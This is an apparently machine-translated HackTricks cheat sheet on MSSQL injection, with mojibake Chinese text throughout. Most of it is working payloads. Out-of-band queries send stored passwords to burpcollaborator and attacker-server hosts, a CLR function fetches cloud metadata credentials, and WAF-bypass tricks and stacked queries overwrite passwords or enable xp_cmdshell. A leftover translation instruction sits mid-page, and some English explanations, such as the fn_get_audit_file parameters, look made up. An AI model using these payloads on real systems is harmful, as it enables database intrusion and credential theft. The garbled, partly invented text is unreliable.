# MSSQLæ³¨å…¥

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## Active Directoryæšä¸¾

å¯èƒ½å¯ä»¥é€šè¿‡åœ¨MSSQLæœåŠ¡å™¨å†…éƒ¨ä½¿ç”¨ä»¥ä¸‹MSSQLå‡½æ•°æ¥**æšä¸¾åŸŸç”¨æˆ·çš„SQLæ³¨å…¥**ï¼š

* **`SELECT DEFAULT_DOMAIN()`**ï¼šè·å–å½“å‰åŸŸåã€‚
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**ï¼šå¦‚æœä½ çŸ¥é“åŸŸåï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯_DOMAIN_ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°å°†ä»¥åå…­è¿›åˆ¶æ ¼å¼è¿”å›ç”¨æˆ·Administratorçš„**SID**ã€‚å®ƒçœ‹èµ·æ¥åƒ`0x01050000000[...]0000f401`ï¼Œæ³¨æ„**æœ€å4ä¸ªå­—èŠ‚**æ˜¯**å¤§ç«¯æ ¼å¼**ä¸­çš„**500**ï¼Œè¿™æ˜¯**ç®¡ç†å‘˜ç”¨æˆ·çš„å¸¸è§ID**ã€‚\
è¿™ä¸ªå‡½æ•°å°†å…è®¸ä½ **çŸ¥é“åŸŸçš„ID**ï¼ˆé™¤äº†æœ€å4ä¸ªå­—èŠ‚ï¼‰ã€‚
* **`SUSER_SNAME(0x01050000000[...]0000e803)`**ï¼šè¿™ä¸ªå‡½æ•°å°†è¿”å›æŒ‡å®šIDçš„**ç”¨æˆ·å**ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯**0000e803**ï¼Œå¤§ç«¯æ ¼å¼ç­‰äº**1000**ï¼ˆé€šå¸¸è¿™æ˜¯ç¬¬ä¸€ä¸ªå¸¸è§„ç”¨æˆ·IDçš„IDï¼‰ã€‚ç„¶åä½ å¯ä»¥å°è¯•ä»1000åˆ°2000çš„ç”¨æˆ·IDè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå¯èƒ½ä¼šå¾—åˆ°åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åã€‚ä¾‹å¦‚ä½¿ç”¨ä»¥ä¸‹å‡½æ•°ï¼š
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **æ›¿ä»£é”™è¯¯åŸºäºçš„å‘é‡**

åŸºäºé”™è¯¯çš„SQLæ³¨å…¥é€šå¸¸ç±»ä¼¼äº`+AND+1=@@version--`è¿™æ ·çš„ç»“æ„ï¼Œä»¥åŠåŸºäºÂ«ORÂ»è¿ç®—ç¬¦çš„å˜ä½“ã€‚åŒ…å«è¿™äº›è¡¨è¾¾å¼çš„æŸ¥è¯¢é€šå¸¸ä¼šè¢«WAFsé˜»æ­¢ã€‚ä¸ºäº†ç»•è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨%2bå­—ç¬¦å°†å­—ç¬¦ä¸²ä¸è§¦å‘æ‰€éœ€æ•°æ®ç±»å‹è½¬æ¢é”™è¯¯çš„ç‰¹å®šå‡½æ•°è°ƒç”¨çš„ç»“æœè¿æ¥èµ·æ¥ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›è¿™æ ·çš„å‡½æ•°çš„ç¤ºä¾‹ï¼š

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

ä½¿ç”¨å‡½æ•°`USER_NAME()`çš„ç¤ºä¾‹ï¼š
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

### `fn_xe_file_target_read_file`

SSRFï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¬ºéª—æœåŠ¡å™¨å‘èµ·ä¼ªé€ çš„è¯·æ±‚ã€‚åœ¨MSSQLä¸­ï¼Œ`fn_xe_file_target_read_file`å‡½æ•°å¯ä»¥è¢«åˆ©ç”¨æ¥æ‰§è¡ŒSSRFæ”»å‡»ã€‚
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**æƒé™ï¼š** éœ€è¦åœ¨æœåŠ¡å™¨ä¸Šå…·æœ‰**`VIEW SERVER STATE`**æƒé™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

`fn_get_audit_file` is a built-in function in Microsoft SQL Server that allows you to retrieve audit information from the SQL Server Audit feature. This function is used to read the audit file and return the audit records in a tabular format.

To use `fn_get_audit_file`, you need to provide the path of the audit file and specify the file type. The function supports different file types such as ERRORLOG, SECURITY_LOG, and AUDIT_LOG. You can also specify additional parameters like the initial file number and the maximum number of files to read.

Here is the syntax for using `fn_get_audit_file`:

```sql
SELECT * FROM sys.fn_get_audit_file ('audit_file_path', initial_file_number, maximum_files, file_type)
```

- `audit_file_path`: The path of the audit file.
- `initial_file_number`: The initial file number to start reading from (optional).
- `maximum_files`: The maximum number of files to read (optional).
- `file_type`: The type of audit file to read (e.g., ERRORLOG, SECURITY_LOG, AUDIT_LOG).

By using `fn_get_audit_file`, you can easily retrieve and analyze audit information from the SQL Server Audit feature. This can be useful for monitoring and troubleshooting purposes, as well as for compliance and security audits.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**æƒé™ï¼š** éœ€è¦ **`CONTROL SERVER`** æƒé™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettable`

`fn_trace_gettable` is a built-in function in Microsoft SQL Server that allows you to read the contents of a trace file and return the data as a table. This function is commonly used for troubleshooting and analyzing SQL Server trace files.

To use `fn_trace_gettable`, you need to provide the path of the trace file and specify the columns you want to retrieve. The function will then parse the trace file and return the requested data in a tabular format.

Here is the syntax for using `fn_trace_gettable`:

```sql
SELECT *
FROM fn_trace_gettable('C:\Path\To\TraceFile.trc', default)
```

In the above example, `C:\Path\To\TraceFile.trc` is the path to the trace file you want to read. The `default` parameter specifies the default file format for the trace file.

It's important to note that `fn_trace_gettable` requires the appropriate permissions to access the trace file. Additionally, you should exercise caution when using this function, as it can potentially expose sensitive information if used improperly.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**æƒé™ï¼š** éœ€è¦ **`CONTROL SERVER`** æƒé™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

åœ¨ä½¿ç”¨MSSQLæ—¶ï¼Œæœ€å¸¸è§çš„è¿›è¡Œç½‘ç»œè°ƒç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹`xp_dirtree`ï¼Œè¿™ä¸ªå­˜å‚¨è¿‡ç¨‹åœ¨å¾®è½¯çš„æ–‡æ¡£ä¸­æ²¡æœ‰è®°å½•ï¼Œä½†åœ¨äº’è”ç½‘ä¸Šè¢«å…¶ä»–äºº[è®°å½•ä¸‹æ¥](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/)ã€‚è¿™ç§æ–¹æ³•å·²ç»åœ¨äº’è”ç½‘ä¸Šçš„[å¤šä¸ªç¤ºä¾‹](https://www.notsosecure.com/oob-exploitation-cheatsheet/)ä¸­è¢«ç”¨äº[å¸¦å¤–æ•°æ®æ³„éœ²](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/)çš„æ–‡ç« ä¸­ã€‚

åŸºæœ¬ä¸Šï¼Œ
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
ä¸MySQLçš„`LOAD_FILE`ç±»ä¼¼ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`xp_dirtree`å‘**ä»…é™TCPç«¯å£445**å‘å‡ºç½‘ç»œè¯·æ±‚ã€‚æ‚¨æ— æ³•æ§åˆ¶ç«¯å£å·ï¼Œä½†å¯ä»¥ä»ç½‘ç»œå…±äº«ä¸­è¯»å–ä¿¡æ¯ã€‚

**PSï¼š**è¿™åœ¨é»˜è®¤é…ç½®ä¸‹æ— æ³•åœ¨è¿è¡Œåœ¨`Windows Server 2016 Datacenter`ä¸Šçš„`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`ä¸Šå·¥ä½œã€‚

è¿˜æœ‰å…¶ä»–å­˜å‚¨è¿‡ç¨‹ï¼Œä¾‹å¦‚[**`master..xp_fileexist`**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx)æˆ–**`xp_subdirs`**å¯ä»¥ç”¨äºç±»ä¼¼çš„ç»“æœã€‚

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

æ˜¾ç„¶ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨**`xp_cmdshell`**æ¥æ‰§è¡Œè§¦å‘**SSRF**çš„æ“ä½œã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»é¡µé¢ä¸­çš„ç›¸å…³éƒ¨åˆ†ï¼š

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQLç”¨æˆ·å®šä¹‰å‡½æ•° - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

ç¼–å†™**CLR UDF**ï¼ˆCommon Language Runtimeç”¨æˆ·å®šä¹‰å‡½æ•° - ä½¿ç”¨ä»»ä½•**.NET**è¯­è¨€ç¼–å†™çš„ä»£ç ï¼Œå¹¶ç¼–è¯‘ä¸º**DLL**ï¼‰å¹¶åœ¨MSSQLä¸­**åŠ è½½å®ƒä»¥è¿›è¡Œè‡ªå®šä¹‰å‡½æ•°**éå¸¸ç®€å•ã€‚ä½†æ˜¯ï¼Œè¿™éœ€è¦`dbo`è®¿é—®æƒé™ï¼Œå› æ­¤ï¼Œé™¤éWebåº”ç”¨ç¨‹åºè¿æ¥åˆ°æ•°æ®åº“æ—¶ä½¿ç”¨`sa`æˆ–ç®¡ç†å‘˜è§’è‰²ï¼Œå¦åˆ™å¯èƒ½æ— æ³•æ­£å¸¸å·¥ä½œã€‚

[æ­¤Githubå­˜å‚¨åº“åŒ…å«Visual Studioé¡¹ç›®å’Œå®‰è£…è¯´æ˜](https://github.com/infiniteloopltd/SQLHttp)ï¼Œä»¥å°†äºŒè¿›åˆ¶æ–‡ä»¶ä½œä¸ºCLRç¨‹åºé›†åŠ è½½åˆ°MSSQLä¸­ï¼Œç„¶åä»MSSQLä¸­è°ƒç”¨HTTP GETè¯·æ±‚ã€‚

[`http.cs`ä»£ç ä½¿ç”¨`WebClient`ç±»è¿›è¡ŒGETè¯·æ±‚å¹¶è·å–å†…å®¹](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
åœ¨å®‰è£…è¯´æ˜ä¸­ï¼Œåœ¨`CREATE ASSEMBLY`æŸ¥è¯¢ä¹‹å‰è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°†ç¨‹åºé›†çš„SHA512å“ˆå¸Œæ·»åŠ åˆ°æœåŠ¡å™¨çš„å—ä¿¡ä»»ç¨‹åºé›†åˆ—è¡¨ä¸­ï¼ˆå¯ä»¥ä½¿ç”¨`select * from sys.trusted_assemblies;`æŸ¥çœ‹åˆ—è¡¨ï¼‰ã€‚
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
ä¸€æ—¦æ·»åŠ äº†ç¨‹åºé›†å¹¶åˆ›å»ºäº†å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥è¿›è¡ŒHTTPè¯·æ±‚ã€‚
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/15.png)

## **å¿«é€Ÿåˆ©ç”¨ï¼šä¸€æ¬¡æŸ¥è¯¢æ£€ç´¢æ•´ä¸ªè¡¨**

æœ‰ä¸¤ç§ç®€å•çš„æ–¹æ³•å¯ä»¥åœ¨ä¸€æ¬¡æŸ¥è¯¢ä¸­æ£€ç´¢æ•´ä¸ªè¡¨çš„å†…å®¹â€”â€”ä½¿ç”¨FOR XMLæˆ–FOR JSONå­å¥ã€‚FOR XMLå­å¥éœ€è¦æŒ‡å®šä¸€ä¸ªæ¨¡å¼ï¼Œæ¯”å¦‚â€œrawâ€ï¼Œæ‰€ä»¥ä»ç®€æ´æ€§çš„è§’åº¦æ¥çœ‹ï¼ŒFOR JSONè¦ä¼˜äºå®ƒã€‚

æŸ¥è¯¢ä»å½“å‰æ•°æ®åº“ä¸­æ£€ç´¢æ¨¡å¼ã€è¡¨å’Œåˆ—çš„æŸ¥è¯¢ï¼š
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

åŸºäºé”™è¯¯çš„å‘é‡éœ€è¦ä¸€ä¸ªåˆ«åæˆ–åç§°ï¼Œå› ä¸ºæ²¡æœ‰åˆ«åæˆ–åç§°çš„è¡¨è¾¾å¼çš„è¾“å‡ºæ— æ³•æ ¼å¼åŒ–ä¸ºJSONã€‚
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **è·å–å½“å‰æŸ¥è¯¢**

å¯ä»¥ä»è®¿é—®`sys.dm_exec_requests`å’Œ`sys.dm_exec_sql_text`ä¸­è·å–æ­£åœ¨æ‰§è¡Œçš„å½“å‰SQLæŸ¥è¯¢ï¼š
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/9.png)

**æƒé™ï¼š** å¦‚æœç”¨æˆ·åœ¨æœåŠ¡å™¨ä¸Šå…·æœ‰VIEW SERVER STATEæƒé™ï¼Œåˆ™ç”¨æˆ·å°†çœ‹åˆ°SQL Serverå®ä¾‹ä¸Šçš„æ‰€æœ‰æ­£åœ¨æ‰§è¡Œçš„ä¼šè¯ï¼›å¦åˆ™ï¼Œç”¨æˆ·åªèƒ½çœ‹åˆ°å½“å‰ä¼šè¯ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **ç»•è¿‡WAFçš„å°æŠ€å·§**

éæ ‡å‡†ç©ºç™½å­—ç¬¦ï¼š %C2%85 æˆ– %C2%A0:
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
ç§‘å­¦ï¼ˆ0eï¼‰å’Œåå…­è¿›åˆ¶ï¼ˆ0xï¼‰è¡¨ç¤ºæ³•ç”¨äºæ··æ·†UNIONï¼š
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
åœ¨FROMå’Œåˆ—åä¹‹é—´ä½¿ç”¨å¥ç‚¹è€Œä¸æ˜¯ç©ºæ ¼ï¼š
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
åœ¨SELECTå’Œä¸€ä¸ªä¸´æ—¶åˆ—ä¹‹é—´ä½¿ç”¨\Nåˆ†éš”ç¬¦ï¼š
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
### ä½¿ç”¨éä¼ ç»Ÿçš„å †å æŸ¥è¯¢ç»•è¿‡WAF

æ ¹æ®[**è¿™ç¯‡åšå®¢æ–‡ç« **](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)ï¼Œåœ¨MSSQLä¸­å¯ä»¥åœ¨ä¸ä½¿ç”¨";"çš„æƒ…å†µä¸‹å †å æŸ¥è¯¢ï¼š

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

å› æ­¤ï¼Œä¾‹å¦‚ï¼Œå¤šä¸ªæŸ¥è¯¢å¯ä»¥è¿™æ ·å†™ï¼š
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
ä»¥ä¸‹æ˜¯æœ‰å…³é»‘å®¢æŠ€æœ¯çš„å†…å®¹ã€‚ä»¥ä¸‹å†…å®¹æ¥è‡ªæ–‡ä»¶/hive/hacktricks/pentesting-web/sql-injection/mssql-injection.mdã€‚å°†ç›¸å…³çš„è‹±æ–‡æ–‡æœ¬ç¿»è¯‘æˆä¸­æ–‡ï¼Œå¹¶è¿”å›ç¿»è¯‘ç»“æœï¼Œä¿æŒå®Œå…¨ç›¸åŒçš„markdownå’Œhtmlè¯­æ³•ã€‚è¯·ä¸è¦ç¿»è¯‘ä»£ç ã€é»‘å®¢æŠ€æœ¯åç§°ã€é»‘å®¢æœ¯è¯­ã€äº‘/è½¯ä»¶å³æœåŠ¡å¹³å°åç§°ï¼ˆå¦‚Workspaceã€awsã€gcp...ï¼‰ã€æ³„æ¼ä¸€è¯ã€æ¸—é€æµ‹è¯•å’Œmarkdownæ ‡ç­¾ã€‚æ­¤å¤–ï¼Œè¯·ä¸è¦æ·»åŠ ä»»ä½•é¢å¤–çš„å†…å®¹ï¼Œåªéœ€æä¾›ç¿»è¯‘å’Œmarkdownè¯­æ³•å³å¯ã€‚
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
å› æ­¤ï¼Œå¯èƒ½ä¼šç»•è¿‡ä¸è€ƒè™‘è¿™ç§å †å æŸ¥è¯¢å½¢å¼çš„ä¸åŒWAFã€‚ä¾‹å¦‚ï¼š
```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```
## å‚è€ƒèµ„æ–™

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#MSSQL](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#MSSQL)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å– PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆâ€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
